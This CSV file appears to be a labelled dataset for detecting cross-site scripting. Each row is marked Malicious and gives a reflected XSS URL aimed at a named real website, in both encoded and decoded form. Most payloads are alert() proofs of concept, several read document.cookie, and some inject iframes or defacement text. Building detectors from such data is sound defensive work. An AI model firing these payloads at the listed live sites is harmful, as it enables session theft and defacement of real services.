Payloads,Class,decoded,executed,parser_changed
http://www.wirelessanarchy.com/process.rvt?cat1='%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script<br>%3ecommunity%20groups&amp;cat2=asia&amp;cat3=china&amp;cat4=all&amp;edit=0000,Malicious,"http://www.wirelessanarchy.com/process.rvt?cat1='""></title><script>alert(1337)</script>community groups&cat2=asia&cat3=china&cat4=all&edit=0000",True,True
http://www.lovebreakmusic.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.lovebreakmusic.com/guestbook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://cgi.din.or.jp/~osayo/cgi/diary/diary.cgi?action=move&amp;year=200'%3e%22%3e'%3e%3cscript%3ealert(<br>%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious,"http://cgi.din.or.jp/~osayo/cgi/diary/diary.cgi?action=move&year=200'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://www.alexnursing.edu.eg/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script<br>%3e,Malicious,"http://www.alexnursing.edu.eg/news.php?id='""></title><script>alert(1337)</script>",True,True
http://www.volkswagen.ch/vw/newbeetle/new.jsp?modell=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.volkswagen.ch/vw/newbeetle/new.jsp?modell=""><script>alert(""maxwel"")</script>",True,True
http://www.wqmzj.gov.cn/download.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;smallcla<br>ssname=%b3%c7%ca%d0%b5%cd%b1%a3,Malicious,"http://www.wqmzj.gov.cn/download.asp?bigclassname=<script>alert(""xss"")</script>&smallclassname=���еͱ�",True,True
http://www.kashaw.com/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kashaw.com/igallery33/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://ms120.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms120.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.klenky.ch/gu3stbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.klenky.ch/gu3stbook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.tj.rs.gov.br/%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious,http://www.tj.rs.gov.br/}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://sourceforge.net/community/?s=search+community%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscri<br>pt%3e%22%27,Malicious,"http://sourceforge.net/community/?s=search community"">'><script>alert(123)</script>""'",True,True
http://www.nope.dk/sog.php?sog=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.nope.dk/sog.php?sog=""><script>alert(document.cookie)</script>",True,True
http://s1.asmandez.ir/login.php/%22%27%3e%3c/a%3e%3cscript%3ealert%28/securitylab/%29%3c/script%3e,Malicious,"http://s1.asmandez.ir/login.php/""'></a><script>alert(/securitylab/)</script>",True,True
http://www.sciencenewsforkids.org/pages/search.asp?catid=6&amp;subcatid=&amp;search=&quot;&gt;&lt;script&gt;alert('0ssi3_t<br>r')&lt;/script&gt;,Malicious,"http://www.sciencenewsforkids.org/pages/search.asp?catid=6&subcatid=&search=""><script>alert('0ssi3_tr')</script>",True,True
http://www.wwf.org.za/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious,"http://www.wwf.org.za/index.cfm?uglobalsearch=""><script>alert('xss')</script>&x=0&y=0",True,True
http://www.usabadminton.org/page.asp?page=usa%20badminton%20history%27%22%3e%3c/title%3e%3cscript%3e<br>alert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.usabadminton.org/page.asp?page=usa badminton history'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.wer-weiss-was.de/app/search/global?searchtext=%3c%22%3c%3cscript%3ealert(document.cookie)<br>%3c%2fscript%3e&amp;search_what=e&amp;search_what=t&amp;submit.search=1&amp;bool=a&amp;type=beginnings&amp;level=1&amp;level=2&amp;l<br>evel=4&amp;level=8,Malicious,"http://www.wer-weiss-was.de/app/search/global?searchtext=<""<<script>alert(document.cookie)</script>&search_what=e&search_what=t&submit.search=1&bool=a&type=beginnings&level=1&level=2&level=4&level=8",True,True
http://www.campuslife.cornell.edu/frames/?url=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.campuslife.cornell.edu/frames/?url=""><script>alert(""maxwel"")</script>",True,True
http://help.travian.bg/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,Malicious,"http://help.travian.bg/index.php?type=faq&mod=""><script>alert(/xss by redtuning/);</script>",True,True
http://www.nvidia.fr/content/driverdownload/widget_code.asp?lang=%3c/textarea%3e%27%22%3e%3c/title%3<br>e%3cscript%3ealert(1337)%3c/script%3e,Malicious,"http://www.nvidia.fr/content/driverdownload/widget_code.asp?lang=</textarea>'""></title><script>alert(1337)</script>",True,True
http://webhome.cs.uvic.ca/~gtzan/music.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://webhome.cs.uvic.ca/~gtzan/music.html'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
https://register.go.com/abcotv/registration/register?stationcode=%22%3e%3ciframe%20src=http://google<br>.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"https://register.go.com/abcotv/registration/register?stationcode=""><iframe src=http://google.com></iframe><script>alert(document.cookie);</script>",True,True
http://chrl.nl/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://chrl.nl/index.php/""><script>alert(1);</script>",True,True
"http://www.banking.hsbc.co.in/script/in/personal/mfs/dailynav2.asp?house=franklin%20templeton%20mutu<br>al%20fund%3cscript%3ealert('agd_scorp,%20also%20has%20sql%20bug ;)')%3c/script%3e",Malicious,"http://www.banking.hsbc.co.in/script/in/personal/mfs/dailynav2.asp?house=franklin templeton mutual fund<script>alert('agd_scorp, also has sql bug ;)')</script>",True,True
http://www.powerclub.com.tr/tumsarkilar.jsp?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.powerclub.com.tr/tumsarkilar.jsp?id=""><script>alert(document.cookie)</script>",True,True
http://us.imdb.com/register/?why=mymovies;ref=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://us.imdb.com/register/?why=mymovies;ref=""><script>alert(1)</script>",True,True
http://www.italia.gov.it/itagov2/content/cerca-i-servizi-online?param3=lavoro'%20%3cscript%3ealert(d<br>ocument.cookie);%3c/script%3e,Malicious,http://www.italia.gov.it/itagov2/content/cerca-i-servizi-online?param3=lavoro' <script>alert(document.cookie);</script>,True,True
username=%2f%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e&password=%2f%22%3e%3cscript%3ealert%281%29 %3c%2fscript%3e,Malicious,"username=/""><script>alert(1)</script>&password=/""><script>alert(1) </script>",True,True
http://dart.fine-art.com/messagelist.asp?intboardid=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,Malicious,"http://dart.fine-art.com/messagelist.asp?intboardid=""><script>alert(""cyber"")</script>",True,True
http://www.militaria.nl/shop.php?categorie=26/shop.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(133<br>7)%3c/script%3e,Malicious,"http://www.militaria.nl/shop.php?categorie=26/shop.php?id='""></title><script>alert(1337)</script>",True,True
http://www.studieninformation.de/jsp/default.jsp?page_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.studieninformation.de/jsp/default.jsp?page_id=""><script>alert(""maxwel"")</script>",True,True
http://www.tcnjathletics.com/news/gen/2004/7/27/04lindy's.asp?path=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious,"http://www.tcnjathletics.com/news/gen/2004/7/27/04lindy's.asp?path=""><script>alert(""maxwel"")</script>",True,True
http://www.amxku.net/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6<br>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29<br>%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious,"http://www.amxku.net/?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(88,83,83))</script>
&page=1",True,True
http://www.sharif.edu/4all/archive/fa-showarch.jsp?arch=1%22/%3e%3cscript%3ealert%28/securitylab.ir/<br>%29%3c/script%3e,Malicious,"http://www.sharif.edu/4all/archive/fa-showarch.jsp?arch=1""/><script>alert(/securitylab.ir/)</script>",True,True
http://www.fedecegeps.qc.ca/index.php?section=14%22%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e,Malicious,"http://www.fedecegeps.qc.ca/index.php?section=14""><script>alert('xss')</script>",True,True
http://search.gbg.bg/search.phtml?q=x&amp;submit=%d2%fa%f0%f1%e8&amp;s=0&amp;wh=0&amp;ea=0&amp;count=%22%3e%27%3e%3cscri<br>pt%3ealert(123)%3c/script%3e&amp;order=0&amp;ct=0,Malicious,"http://search.gbg.bg/search.phtml?q=x&submit=�����&s=0&wh=0&ea=0&count="">'><script>alert(123)</script>&order=0&ct=0",True,True
http://8e.devbio.com/article.php?id=%22%20%27%3e%3cscript%3ealert(%27cueballr%27)%3c/script%3e,Malicious,"http://8e.devbio.com/article.php?id="" '><script>alert('cueballr')</script>",True,True
https://www.eurosheetmusic.com/search.asp?qa=anderman%2c+luis+de&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"https://www.eurosheetmusic.com/search.asp?qa=anderman, luis de""><script>alert(""bluemax"")</script>",True,True
http://www.sjsharks.com/news/news.asp?story_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.sjsharks.com/news/news.asp?story_id=""><script>alert(""maxwel"")</script>",True,True
http://www.cryingpuppet.com/musicians.asp?ara=%22%3e%3cscript%3ealert%28%22maxwel%22%29%3c%2fscript%<br>3e&amp;x=9&amp;y=7,Malicious,"http://www.cryingpuppet.com/musicians.asp?ara=""><script>alert(""maxwel"")</script>&x=9&y=7",True,True
http://www.ippt.gov.pl/~mstan/tests/test.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%<br>3e,Malicious,"http://www.ippt.gov.pl/~mstan/tests/test.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://www.search.um.dk/search.aspx?pc=&amp;pckid=9450346&amp;aid=356062&amp;pt=6018936&amp;%27%22%3e%3c/title%3e%3c<br>script%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ead<br>did=&amp;wtid=9463028&amp;scope=8801213&amp;sw=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%<br>3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e%27%22%3e%3c%2ftitle%3e%3cscript%3ealer<br>t(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://www.search.um.dk/search.aspx?pc=&pckid=9450346&aid=356062&pt=6018936&'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>addid=&wtid=9463028&scope=8801213&sw='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://search-o-rama.com/confirm/confirm.asp?semail=&amp;surl=%3cscript%3ealert('hacked%20st@rext')%3c/s<br>cript%3e,Malicious,http://search-o-rama.com/confirm/confirm.asp?semail=&surl=<script>alert('hacked st@rext')</script>,True,True
http://kr.arsenal.com//member/member_login.asp?url=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious,"http://kr.arsenal.com//member/member_login.asp?url=""><script>alert(/xss/)</script>",True,True
http://www.clubedohardware.com.br/busca.php?q=%3cscript%3ealert(666)%3c/script%3e&amp;sa=procurar&amp;domain<br>s=clubedohardware.com.br&amp;sitesearch=clubedohardware.com.br&amp;forid=1&amp;ie=iso-8859-1&amp;oe=iso-8859-1&amp;flav=<br>0000,Malicious,http://www.clubedohardware.com.br/busca.php?q=<script>alert(666)</script>&sa=procurar&domains=clubedohardware.com.br&sitesearch=clubedohardware.com.br&forid=1&ie=iso-8859-1&oe=iso-8859-1&flav=0000,True,True
http://store.steampowered.com/news/?term='&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;marquee%20bgcolor<br>=&quot;red&quot;&gt;&lt;h1&gt;xss%20by%20xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://store.steampowered.com/news/?term='""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
http://fileshunt.com/?q=xy%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%<br>3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3elitol&amp;ftype=0%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://fileshunt.com/?q=xy'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>litol&ftype=0'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.scattolinsnc.it/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.scattolinsnc.it/igallery/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.trojaner-info.de/cgi-bin/download.cgi?file=%3e%3ctitle%3enorehem%20was%20here%3c/title%3e<br>%3cscript%3edocument.write('norehem%20was%20here')%3c/script%3e%3cmarquee%3e%3ch1%3enorehem%20was%20<br>here%3c/h1%3e%3c/marquee%3e%3cimg%20src=%22http://mexico.udg.mx/politica/simbolospatrios/imagen/band<br>era2.gif%22%3e%3cscript%3ealert%20('norehem%20was%20here')%3c/script%3e%3c,Malicious,"http://www.trojaner-info.de/cgi-bin/download.cgi?file=><title>norehem was here</title><script>document.write('norehem was here')</script><marquee><h1>norehem was here</h1></marquee><img src=""http://mexico.udg.mx/politica/simbolospatrios/imagen/bandera2.gif""><script>alert ('norehem was here')</script><",True,True
http://www.resimupload.com/resim.php?q=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.resimupload.com/resim.php?q=""><script>alert(document.cookie)</script>",True,True
http://webmodis.iis.u-tokyo.ac.jp/iis/qkm/index.php?filename=%27%22%3e%3c/title%3e%3cscript%3ealert%<br>281337%29%3c/script%3e&amp;index=0&amp;nwlat=&amp;nwlon=&amp;selon=&amp;selat=&amp;email=&amp;create=submit+request,Malicious,"http://webmodis.iis.u-tokyo.ac.jp/iis/qkm/index.php?filename='""></title><script>alert(1337)</script>&index=0&nwlat=&nwlon=&selon=&selat=&email=&create=submit request",True,True
http://www.redtube.com/iframe/tower/fling025/index.php?clicktag=%22%3e%3cscript%3ealert('xssed')%3c/<br>script%3e%3cblink%3exssed!clickme%3ciframe%20src=%22http://www.xssed.com%22%3e,Malicious,"http://www.redtube.com/iframe/tower/fling025/index.php?clicktag=""><script>alert('xssed')</script><blink>xssed!clickme<iframe src=""http://www.xssed.com"">",True,True
http://www.metallica.com/timeline.asp?page=tour&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;html&gt;&lt;<br>input%20type=&quot;file&quot;&gt;&lt;/html&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.metallica.com/timeline.asp?page=tour&id=""><script>alert(document.cookie)</script>><html><input type=""file""></html><marquee><h1>backdoor</h1></marquee>",True,True
http://www.excite.co.jp/world/english/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br>e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;wb_submit=%83e%83f%83u%83y%81%5b%83w%96%7c<br>%96%f3&amp;wb_lp=enja&amp;wb_dis=2,Malicious,"http://www.excite.co.jp/world/english/web/proceeding/?wb_url=http://kusomiso.com/"">'><script>alert(""kusomiso.com"")</script>&wb_submit=�e�f�u�y�[�w�|��&wb_lp=enja&wb_dis=2",True,True
http://www.templatehelp.com/pr_interface.php?bgcolor=%23ffffff&amp;cols=4&amp;rows=4&amp;sp=5&amp;sadult=0&amp;pr_code=i<br>y9p88mxzw4gs37njlersf01e23p6c&amp;category=0&amp;keyword=%22%3cscript%3ealert%28document.cookie%29%3b%3c%2fs<br>cript%3e&amp;extref=http%253a%2f%2fsearch.freefind.com%2ffind.html%253fid%253d27600877%2526pageid%253dr%<br>2526mode%253dall%2526n%253d0%2526_charset_%253dutf-8%2526bcd%253d%2525c3%2525b7%2526query%253d%25252<br>2%25253cscript%25253ealert%252528document.cookie%252529%25253b%25253c%25252fscript%25253e%2526x%253d<br>11%2526y%253d10&amp;extref=http%253a%2f%2fsearch.freefind.com%2ffind.html%253fid%253d27600877%2526pageid<br>%253dr%2526mode%253dall%2526n%253d0%2526_charset_%253dutf-8%2526bcd%253d%2525c3%2525b7%2526query%253<br>d%252522%25253cscript%25253ealert%252528document.cookie%252529%25253b%25253c%25252fscript%25253e%252<br>6x%253d11%2526y%253d10,Malicious,"http://www.templatehelp.com/pr_interface.php?bgcolor=#ffffff&cols=4&rows=4&sp=5&sadult=0&pr_code=iy9p88mxzw4gs37njlersf01e23p6c&category=0&keyword=""<script>alert(document.cookie);</script>&extref=http://search.freefind.com/find.html?id=27600877&pageid=r&mode=all&n=0&_charset_=utf-8&bcd=÷&query=""<script>alert(document.cookie);</script>&x=11&y=10&extref=http://search.freefind.com/find.html?id=27600877&pageid=r&mode=all&n=0&_charset_=utf-8&bcd=÷&query=""<script>alert(document.cookie);</script>&x=11&y=10",True,True
http://www.animenewsnetwork.com/encyclopedia/company.php?id=%22%3e%3cscript%3ealert('trex')%3c%2fscr<br>ipt%3e%3ch1%3ehacked+by+trex%3c%2fh1%3e,Malicious,"http://www.animenewsnetwork.com/encyclopedia/company.php?id=""><script>alert('trex')</script><h1>hacked by trex</h1>",True,True
